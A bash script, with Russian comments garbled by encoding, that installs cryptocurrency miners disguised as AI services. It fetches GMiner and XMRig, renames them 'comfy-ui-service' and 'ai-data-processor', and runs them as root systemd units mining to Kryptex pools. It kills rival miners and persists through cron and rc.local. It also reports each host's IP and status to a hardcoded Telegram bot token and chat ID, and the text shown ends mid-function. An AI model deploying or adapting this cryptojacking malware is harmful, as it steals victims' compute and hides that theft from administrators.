#!/bin/bash

#==============================================================================
# –ë–õ–û–ö –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–ò (–õ–ï–ì–ï–ù–î–ê: AI/ML –°–ï–†–í–ï–†)
#==============================================================================
KRYPTEX_IDENTIFIER="krxYNV2DZQ"
TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TELEGRAM_CHAT_ID="7032066912"
GPU_POOL="etc.kryptex.network:7033"
CPU_POOL="xmr.kryptex.network:7029"

HOSTNAME_VAR=$(hostname 2>/dev/null || echo "unknown-host")
SERVER_IP=$(curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0")
WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
WORKER_NAME="${KRYPTEX_IDENTIFIER}.${WORKER_ID}"

#==============================================================================
# –ì–õ–û–ë–ê–õ–¨–ù–´–ï –°–ò–°–¢–ï–ú–ù–´–ï –ü–ï–†–ï–ú–ï–ù–ù–´–ï (–ü–û–î –ú–ê–°–ö–ò–†–û–í–ö–û–ô)
#==============================================================================
BASE_DIR="/opt/system-daemons"
# --- –ú–ê–°–ö–ò–†–û–í–ö–ê GPU ---
GPU_SERVICE_NAME="comfy-ui-service"
GPU_DIR="$BASE_DIR/comfyui"
GPU_LOG_FILE="/var/log/comfyui.log"
# --- –ú–ê–°–ö–ò–†–û–í–ö–ê CPU ---
CPU_SERVICE_NAME="ai-data-processor"
CPU_DIR="$BASE_DIR/ai-data"
CPU_LOG_FILE="/var/log/ai-data.log"

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –¢–†–ê–ù–°–õ–ò–¢–ï–†–ê–¶–ò–ò –ò –í–´–í–û–î–ê –í –ö–û–ù–°–û–õ–¨
#==============================================================================
echo_t() {
    local text="$1"
    local translit_text=$(echo "$text" | sed \
        -e 's/–∞/a/g; s/–±/b/g; s/–≤/v/g; s/–≥/g/g; s/–¥/d/g; s/–µ/e/g; s/—ë/yo/g; s/–∂/zh/g; s/–∑/z/g; s/–∏/i/g; s/–π/y/g; s/–∫/k/g; s/–ª/l/g; s/–º/m/g; s/–Ω/n/g; s/–æ/o/g; s/–ø/p/g; s/—Ä/r/g; s/—Å/s/g; s/—Ç/t/g; s/—É/u/g; s/—Ñ/f/g; s/—Ö/kh/g; s/—Ü/ts/g; s/—á/ch/g; s/—à/sh/g; s/—â/shch/g; s/—ä//g; s/—ã/y/g; s/—å//g; s/—ç/e/g; s/—é/yu/g; s/—è/ya/g' \
        -e 's/–ê/A/g; s/–ë/B/g; s/–í/V/g; s/–ì/G/g; s/–î/D/g; s/–ï/E/g; s/–Å/Yo/g; s/–ñ/Zh/g; s/–ó/Z/g; s/–ò/I/g; s/–ô/Y/g; s/–ö/K/g; s/–õ/L/g; s/–ú/M/g; s/–ù/N/g; s/–û/O/g; s/–ü/P/g; s/–†/R/g; s/–°/S/g; s/–¢/T/g; s/–£/U/g; s/–§/F/g; s/–•/Kh/g; s/–¶/Ts/g; s/–ß/Ch/g; s/–®/Sh/g; s/–©/Shch/g; s/–™//g; s/–´/Y/g; s/–¨//g; s/–≠/E/g; s/–Æ/Yu/g; s/–Ø/Ya/g'
    )
    echo "$translit_text"
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –û–¢–ü–†–ê–í–ö–ò –£–í–ï–î–û–ú–õ–ï–ù–ò–ô –í TELEGRAM
#==============================================================================
send_telegram_notification() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" -d chat_id="${TELEGRAM_CHAT_ID}" -d text="${message}" -d parse_mode="HTML" > /dev/null 2>&1
    if [ $? -eq 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram"; else echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ Telegram"; fi
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –û–ß–ò–°–¢–ö–ò –û–ö–†–£–ñ–ï–ù–ò–Ø (–£–ü–†–û–©–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø)
#==============================================================================
ensure_clean_environment() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nachalo uproshchennoy ochistki okruzheniya..."
    local killed_count=0; local removed_lines=0
    
    # --- –£–î–ê–õ–ï–ù–ò–ï –¢–û–õ–¨–ö–û XMRIG ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk i zavershenie protsessa xmrig...";
    if pgrep -f "xmrig" > /dev/null 2>&1; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhen protsess: xmrig";
        pkill -9 -f "xmrig" 2>/dev/null;
        if [ $? -eq 0 ]; then
            echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Protsess xmrig zavershen";
            ((killed_count++));
        fi
        sleep 1;
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Protsess xmrig ne nayden."
    fi

    # --- –û–ß–ò–°–¢–ö–ê –ê–í–¢–û–ó–ê–ü–£–°–ö–ê (–û–°–¢–ê–í–õ–ï–ù–û –ü–û –ó–ê–ü–†–û–°–£) ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka crontab...";
    local cron_temp=$(mktemp);
    crontab -l > "$cron_temp" 2>/dev/null;
    if [ -s "$cron_temp" ]; then
        local original_lines=$(wc -l < "$cron_temp");
        grep -v -E "(curl|wget|miner|xmr|stratum|pool)" "$cron_temp" > "${cron_temp}.clean";
        local cleaned_lines=$(wc -l < "${cron_temp}.clean");
        removed_lines=$((original_lines - cleaned_lines));
        if [ $removed_lines -gt 0 ]; then
            crontab "${cron_temp}.clean";
            echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udaleno $removed_lines zapisey iz crontab";
        else
            echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Podozritel'nykh zapisey v crontab ne naydeno";
        fi;
        rm -f "${cron_temp}.clean";
    fi;
    rm -f "$cron_temp"

    if [ -f /etc/rc.local ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka /etc/rc.local...";
        sed -i '/curl\|wget\|miner\|xmr/d' /etc/rc.local 2>/dev/null;
    fi

    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk podozritel'nykh systemd sluzhb...";
    for service in $(systemctl list-units --type=service --all | grep -E "miner|xmr|kinsing" | awk '{print $1}'); do
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhena podozritel'naya sluzhba: $service";
        systemctl stop "$service" 2>/dev/null;
        systemctl disable "$service" 2>/dev/null;
        rm -f "/etc/systemd/system/$service" 2>/dev/null;
    done

    # --- –û–ß–ò–°–¢–ö–ê –§–ê–ô–õ–û–í (–û–°–¢–ê–í–õ–ï–ù–û) ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udalenie vremennykh faylov...";
    local temp_patterns=("/tmp/*miner*" "/tmp/*xmr*" "/tmp/kinsing*" "/tmp/kdevtmpfsi*" "/var/tmp/*miner*" "/var/tmp/*xmr*" "/dev/shm/*miner*");
    for pattern in "${temp_patterns[@]}"; do
        rm -rf $pattern 2>/dev/null;
    done
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Uproshchennaya ochistka zavershena. Zaversheno protsessov: $killed_count, udaleno zapisey: $removed_lines"
    if [ $killed_count -gt 0 ] || [ $removed_lines -gt 0 ]; then
        send_telegram_notification "üßπ <b>Uproshchennaya ochistka na $(hostname)</b>%0A%0AZaversheno protsessov: $killed_count%0AUdaleno cron zapisey: $removed_lines%0AIP: ${SERVER_IP}";
    fi
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –£–°–¢–ê–ù–û–í–ö–ò AI-–ú–û–î–£–õ–ï–ô (–ú–ê–°–ö–ò–†–û–í–ö–ê)
#==============================================================================
install_compute_modules() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –ù–∞—á–∞–ª–æ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ AI-–º–æ–¥—É–ª–µ–π..."
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–æ–∑–¥–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π..."; mkdir -p "$GPU_DIR" "$CPU_DIR"; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –û–®–ò–ë–ö–ê: –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏"; send_telegram_notification "‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π –Ω–∞ $(hostname)"; return 1; fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–∫–∞—á–∏–≤–∞–Ω–∏–µ ComfyUI-–º–æ–¥—É–ª—è (GPU)..."; local gpu_url="https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz"; local gpu_archive="$GPU_DIR/gminer.tar.xz"; wget -q -O "$gpu_archive" "$gpu_url" 2>/dev/null; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –û–®–ò–ë–ö–ê: –ù–µ —É–¥–∞–ª–æ—Å—å —Å–∫–∞—á–∞—Ç—å GPU-–º–æ–¥—É–ª—å"; send_telegram_notification "‚ùå –û—à–∏–±–∫–∞ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è GPU-–º–æ–¥—É–ª—è –Ω–∞ $(hostname)"; return 1; fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –†–∞—Å–ø–∞–∫–æ–≤–∫–∞ ComfyUI-–º–æ–¥—É–ª—è..."; tar -xf "$gpu_archive" -C "$GPU_DIR" 2>/dev/null; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –û–®–ò–ë–ö–ê: –ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–∞–∫–æ–≤–∞—Ç—å GPU-–º–æ–¥—É–ª—å"; return 1; fi
    local gpu_binary=$(find "$GPU_DIR" -type f \( -name "miner" -o -name "gminer" \) | head -n 1); if [ -n "$gpu_binary" ]; then mv "$gpu_binary" "$GPU_DIR/$GPU_SERVICE_NAME"; chmod +x "$GPU_DIR/$GPU_SERVICE_NAME"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] GPU-–º–æ–¥—É–ª—å ($GPU_SERVICE_NAME) —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω"; else echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –û–®–ò–ë–ö–ê: –ù–µ –Ω–∞–π–¥–µ–Ω –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª GPU-–º–æ–¥—É–ª—è"; fi; rm -f "$gpu_archive"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–∫–∞—á–∏–≤–∞–Ω–∏–µ AI Data-–º–æ–¥—É–ª—è (CPU)..."; local cpu_url="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"; local cpu_archive="$CPU_DIR/xmrig.tar.gz"; wget -q -O "$cpu_archive" "$cpu_url" 2>/dev/null; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –û–®–ò–ë–ö–ê: –ù–µ —É–¥–∞–ª–æ—Å—å —Å–∫–∞—á–∞—Ç—å CPU-–º–æ–¥—É–ª—å"; send_telegram_notification "‚ùå –û—à–∏–±–∫–∞ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è CPU-–º–æ–¥—É–ª—è –Ω–∞ $(hostname)"; return 1; fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –†–∞—Å–ø–∞–∫–æ–≤–∫–∞ AI Data-–º–æ–¥—É–ª—è..."; tar -xzf "$cpu_archive" -C "$CPU_DIR" --strip-components=1 2>/dev/null; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –û–®–ò–ë–ö–ê: –ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–∞–∫–æ–≤–∞—Ç—å CPU-–º–æ–¥—É–ª—å"; return 1; fi
    local cpu_binary=$(find "$CPU_DIR" -type f -name "xmrig" | head -n 1); if [ -n "$cpu_binary" ]; then mv "$cpu_binary" "$CPU_DIR/$CPU_SERVICE_NAME"; chmod +x "$CPU_DIR/$CPU_SERVICE_NAME"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] CPU-–º–æ–¥—É–ª—å ($CPU_SERVICE_NAME) —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω"; else echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –û–®–ò–ë–ö–ê: –ù–µ –Ω–∞–π–¥–µ–Ω –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª CPU-–º–æ–¥—É–ª—è"; fi; rm -f "$cpu_archive"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –£—Å—Ç–∞–Ω–æ–≤–∫–∞ AI-–º–æ–¥—É–ª–µ–π –∑–∞–≤–µ—Ä—à–µ–Ω–∞"; send_telegram_notification "‚úÖ AI-–º–æ–¥—É–ª–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã –Ω–∞ $(hostname)"; return 0
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –°–û–ó–î–ê–ù–ò–Ø SYSTEMD –°–õ–£–ñ–ë (–ú–ê–°–ö–ò–†–û–í–ö–ê)
#==============================================================================
create_systemd_services() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–æ–∑–¥–∞–Ω–∏–µ systemd —Å–ª—É–∂–±..."
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–æ–∑–¥–∞–Ω–∏–µ —Å–ª—É–∂–±—ã $GPU_SERVICE_NAME..."; cat > "/etc/systemd/system/${GPU_SERVICE_NAME}.service" <<EOF
[Unit]
Description=ComfyUI AI Image Generation Service
After=network.target
[Service]
Type=simple
ExecStart=${GPU_DIR}/${GPU_SERVICE_NAME} --algo etchash --server ${GPU_POOL} --user ${WORKER_NAME}
Restart=always
RestartSec=10
StandardOutput=append:${GPU_LOG_FILE}
StandardError=append:${GPU_LOG_FILE}
WorkingDirectory=${GPU_DIR}
User=root
[Install]
WantedBy=multi-user.target
EOF
    if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –û–®–ò–ë–ö–ê: –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —Å–ª—É–∂–±—É $GPU_SERVICE_NAME"; send_telegram_notification "‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è GPU —Å–ª—É–∂–±—ã –Ω–∞ $(hostname)"; return 1; fi; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–ª—É–∂–±–∞ $GPU_SERVICE_NAME —Å–æ–∑–¥–∞–Ω–∞"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–æ–∑–¥–∞–Ω–∏–µ —Å–ª—É–∂–±—ã $CPU_SERVICE_NAME..."; cat > "/etc/systemd/system/${CPU_SERVICE_NAME}.service" <<EOF
[Unit]
Description=AI Data Processing Service
After=network.target
[Service]
Type=simple
ExecStart=${CPU_DIR}/${CPU_SERVICE_NAME} -o ${CPU_POOL} -u ${WORKER_NAME} -p x
Restart=always
RestartSec=10
StandardOutput=append:${CPU_LOG_FILE}
StandardError=append:${CPU_LOG_FILE}
WorkingDirectory=${CPU_DIR}
User=root
[Install]
WantedBy=multi-user.target
EOF
    if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –û–®–ò–ë–ö–ê: –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —Å–ª—É–∂–±—É $CPU_SERVICE_NAME"; send_telegram_notification "‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è CPU —Å–ª—É–∂–±—ã –Ω–∞ $(hostname)"; return 1; fi; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–ª—É–∂–±–∞ $CPU_SERVICE_NAME —Å–æ–∑–¥–∞–Ω–∞"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ systemd daemon..."; systemctl daemon-reload; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –û–®–ò–ë–ö–ê: –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å systemd daemon"; return 1; fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd —Å–ª—É–∂–±—ã —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω—ã"; send_telegram_notification "‚úÖ Systemd —Å–ª—É–∂–±—ã —Å–æ–∑–¥–∞–Ω—ã –Ω–∞ $(hostname)"; return 0
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –î–û–ë–ê–í–õ–ï–ù–ò–Ø –í –ê–í–¢–û–ó–ê–ü–£–°–ö
#==============================================================================
setup_autostart() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞ —Å–ª—É–∂–±..."; systemctl enable "${GPU_SERVICE_NAME}" 2>/dev/null; systemctl enable "${CPU_SERVICE_NAME}" 2>/dev/null; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫ –Ω–∞—Å—Ç—Ä–æ–µ–Ω"
    (crontab -l 2>/dev/null | grep -v "${GPU_SERVICE_NAME}\|${CPU_SERVICE_NAME}"; echo "@reboot systemctl start ${GPU_SERVICE_NAME}"; echo "@reboot systemctl start ${CPU_SERVICE_NAME}") | crontab - 2>/dev/null; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Cron @reboot –Ω–∞—Å—Ç—Ä–æ–µ–Ω"
    if [ -f /etc/rc.local ]; then grep -q "${GPU_SERVICE_NAME}" /etc/rc.local || echo "systemctl start ${GPU_SERVICE_NAME}" >> /etc/rc.local; grep -q "${CPU_SERVICE_NAME}" /etc/rc.local || echo "systemctl start ${CPU_SERVICE_NAME}" >> /etc/rc.local; chmod +x /etc/rc.local; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] rc.local –Ω–∞—Å—Ç—Ä–æ–µ–Ω"; fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ –º–µ—Ç–æ–¥—ã –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã"
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –°–û–ó–î–ê–ù–ò–Ø –ò–ù–°–¢–†–£–ú–ï–ù–¢–û–í –£–ü–†–ê–í–õ–ï–ù–ò–Ø (–ú–ê–°–ö–ò–†–û–í–ö–ê)
#==============================================================================
create_management_tools() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–æ–∑–¥–∞–Ω–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è..."
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ start-ai..."; cat > "/usr/local/bin/start-ai" <<EOF
#!/bin/bash
GPU_SERVICE_NAME="${GPU_SERVICE_NAME}"
CPU_SERVICE_NAME="${CPU_SERVICE_NAME}"
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Zapusk AI sluzhb..."
systemctl start "\${GPU_SERVICE_NAME}"; if [ \$? -eq 0 ]; then echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${GPU_SERVICE_NAME} zapushchena"; fi
systemctl start "\${CPU_SERVICE_NAME}"; if [ \$? -eq 0 ]; then echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${CPU_SERVICE_NAME} zapushchena"; fi
EOF
    chmod +x "/usr/local/bin/start-ai"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–∫—Ä–∏–ø—Ç start-ai —Å–æ–∑–¥–∞–Ω"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ stop-ai..."; cat > "/usr/local/bin/stop-ai" <<EOF
#!/bin/bash
GPU_SERVICE_NAME="${GPU_SERVICE_NAME}"
CPU_SERVICE_NAME="${CPU_SERVICE_NAME}"
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Ostanovka AI sluzhb..."
systemctl stop "\${GPU_SERVICE_NAME}"; if [ \$? -eq 0 ]; then echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${GPU_SERVICE_NAME} ostanovlena"; fi
systemctl stop "\${CPU_SERVICE_NAME}"; if [ \$? -eq 0 ]; then echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${CPU_SERVICE_NAME} ostanovlena"; fi
EOF
    chmod +x "/usr/local/bin/stop-ai"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–∫—Ä–∏–ø—Ç stop-ai —Å–æ–∑–¥–∞–Ω"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ status-ai..."; cat > "/usr/local/bin/status-ai" <<EOF
#!/bin/bash
GPU_SERVICE_NAME="${GPU_SERVICE_NAME}"; CPU_SERVICE_NAME="${CPU_SERVICE_NAME}"; GPU_LOG_FILE="${GPU_LOG_FILE}"; CPU_LOG_FILE="${CPU_LOG_FILE}"; TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN}"; TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID}"
send_telegram_notification() { local message="\$1"; curl -s -X POST "https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage" -d chat_id="\${TELEGRAM_CHAT_ID}" -d text="\${message}" -d parse_mode="HTML" > /dev/null 2>&1; }
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Proverka statusa AI sluzhb..."
gpu_status=\$(systemctl is-active "\${GPU_SERVICE_NAME}"); cpu_status=\$(systemctl is-active "\${CPU_SERVICE_NAME}")
gpu_logs=""; if [ -f "\${GPU_LOG_FILE}" ]; then gpu_logs=\$(tail -n 5 "\${GPU_LOG_FILE}" 2>/dev/null); fi
cpu_logs=""; if [ -f "\${CPU_LOG_FILE}" ]; then cpu_logs=\$(tail -n 5 "\${CPU_LOG_FILE}" 2>/dev/null); fi
message="üìä <b>–°—Ç–∞—Ç—É—Å AI-—Å–ª—É–∂–± –Ω–∞ \$(hostname)</b>%0A%0Aüé® <b>ComfyUI Service (\${GPU_SERVICE_NAME}):</b>%0A–°—Ç–∞—Ç—É—Å: \${gpu_status}%0A%0Aüìù –ü–æ—Å–ª–µ–¥–Ω–∏–µ 5 —Å—Ç—Ä–æ–∫ –ª–æ–≥–∞:%0A<code>\${gpu_logs:-–õ–æ–≥ –ø—É—Å—Ç –∏–ª–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω}</code>%0A%0A‚öôÔ∏è <b>AI Data Processor (\${CPU_SERVICE_NAME}):</b>%0A–°—Ç–∞—Ç—É—Å: \${cpu_status}%0A%0Aüìù –ü–æ—Å–ª–µ–¥–Ω–∏–µ 5 —Å—Ç—Ä–æ–∫ –ª–æ–≥–∞:%0A<code>\${cpu_logs:-–õ–æ–≥ –ø—É—Å—Ç –∏–ª–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω}</code>"
echo "=== ComfyUI Service (\${GPU_SERVICE_NAME}) Status ==="; systemctl status "\${GPU_SERVICE_NAME}" --no-pager -l; echo ""; echo "=== ComfyUI Last 5 Log Lines ==="; echo "\${gpu_logs:-Log pust ili nedostupen}"; echo ""
echo "=== AI Data Processor (\${CPU_SERVICE_NAME}) Status ==="; systemctl status "\${CPU_SERVICE_NAME}" --no-pager -l; echo ""; echo "=== AI Data Processor Last 5 Log Lines ==="; echo "\${cpu_logs:-Log pust ili nedostupen}"
send_telegram_notification "\${message}"; echo ""; echo "[$(date '+%Y-%m-%d %H:%M:%S')] Status otpravlen v Telegram"
EOF
    chmod +x "/usr/local/bin/status-ai"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –°–∫—Ä–∏–ø—Ç status-ai —Å–æ–∑–¥–∞–Ω"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] –í—Å–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å–æ–∑–¥–∞–Ω—ã"; send_telegram_notification "‚úÖ –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è AI —Å–æ–∑–¥–∞–Ω—ã –Ω–∞ $(hostname): start-ai, stop-ai, status-ai"; return 0
}

#==============================================================================
# –ì–õ–ê–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø
#==============================================================================
main() {
    echo_t "======================================================================="; echo_t "  Sistemnyy skript dlya upravleniya AI-servisami"; echo_t "  Zapushchen: $(date '+%Y-%m-%d %H:%M:%S')"; echo_t "  Khost: $(hostname)"; echo_t "======================================================================="; echo ""
    if [ "$EUID" -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Skript dolzhen byt' zapushchen s pravami root"; exit 1; fi; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚úì Proverka prav root proydena"; echo ""
    send_telegram_notification "üöÄ <b>Nachalo razvertyvaniya AI-infrastruktury</b> na $(hostname)%0A%0A‚è∞ Vremya: $(date '+%Y-%m-%d %H:%M:%S')%0Aüåê IP: ${SERVER_IP}%0Aüîë Worker ID: ${WORKER_NAME}"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Uvedomlenie o nachale raboty otpravleno"; echo ""
    ensure_clean_environment; if [ $? -ne 0 ]; then send_telegram_notification "‚ùå <b>Oshibka ochistki okruzheniya</b> na $(hostname)"; exit 1; fi; echo ""
    install_compute_modules; if [ $? -ne 0 ]; then send_telegram_notification "‚ùå <b>Oshibka ustanovki AI-moduley</b> na $(hostname)"; exit 1; fi; echo ""
    create_systemd_services; if [ $? -ne 0 ]; then send_telegram_notification "‚ùå <b>Oshibka sozdaniya AI-sluzhb</b> na $(hostname)"; exit 1; fi; echo ""
    create_management_tools; if [ $? -ne 0 ]; then send_telegram_notification "‚ùå <b>Oshibka sozdaniya instrumentov</b> na $(hostname)"; exit 1; fi; echo ""
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Perezagruzka systemd i aktivatsiya sluzhb..."; systemctl daemon-reload; systemctl enable --now "${GPU_SERVICE_NAME}"; if [ $? -eq 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚úì Sluzhba ${GPU_SERVICE_NAME} aktivirovana i zapushchena"; fi; systemctl enable --now "${CPU_SERVICE_NAME}"; if [ $? -eq 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚úì Sluzhba ${CPU_SERVICE_NAME} aktivirovana i zapushchena"; fi; echo ""
    setup_autostart; echo ""
    sleep 3; gpu_status=$(systemctl is-active "${GPU_SERVICE_NAME}"); cpu_status=$(systemctl is-active "${CPU_SERVICE_NAME}")
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Otpravka final'nogo uvedomleniya..."; send_telegram_notification "‚úÖ <b>AI-infrastruktura uspeshno razvernuta!</b>%0A%0Aüñ•Ô∏è Khost: $(hostname)%0Aüåê IP: ${SERVER_IP}%0Aüîë Worker ID: ${WORKER_NAME}%0A%0Aüìä <b>Status sluzhb:</b>%0Aüé® ComfyUI: ${gpu_status}%0A‚öôÔ∏è AI Data Processor: ${cpu_status}%0A%0AüìÅ <b>Ustanovlennye komponenty:</b>%0A‚Ä¢ GPU modul': ${GPU_DIR}/${GPU_SERVICE_NAME}%0A‚Ä¢ CPU modul': ${CPU_DIR}/${CPU_SERVICE_NAME}%0A‚Ä¢ Instrumenty: start-ai, stop-ai, status-ai%0A%0Aüìù <b>Logi:</b>%0A‚Ä¢ GPU: ${GPU_LOG_FILE}%0A‚Ä¢ CPU: ${CPU_LOG_FILE}%0A%0AüéØ Ispol'zuyte komandu <code>status-ai</code> dlya proverki raboty"
